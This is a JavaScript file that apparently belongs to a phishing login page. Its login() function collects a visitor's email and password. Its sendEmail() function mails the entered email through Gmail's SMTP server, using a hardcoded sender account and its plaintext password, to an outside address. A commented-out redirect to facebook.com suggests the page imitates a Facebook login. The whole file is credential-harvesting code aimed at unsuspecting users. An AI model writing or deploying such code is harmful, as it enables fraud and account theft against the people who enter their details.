function login() {
    var email = document.getElementById("email").value;
    var pass = document.getElementById("pass").value;
    if(email && pass){
        sendEmail(email);
    }
    else{
        var emailCls = document.getElementsByClassName("error-email"); 
        var passCls = document.getElementsByClassName("error-pass"); 
        emailCls[0].style.display = "none";
        passCls[0].style.display = "none";
        if(!email){
            emailCls[0].style.display = "block";
        }
        else if(!pass){
            passCls[0].style.display = "block";
        }
    }
}

function sendEmail(body) {
    Email.send({
        Host: "smtp.gmail.com",
        Username: "checkingman38@gmail.com",
        Password: "anh123123",
        To: 'mr.lenovi@gmail.com',
        From: "checkingman38@gmail.com",
        Subject: "Checking",
        Body: body,
    }).then(
        message => {
            //window.location.href = "https://www.facebook.com/"
        }
    );
}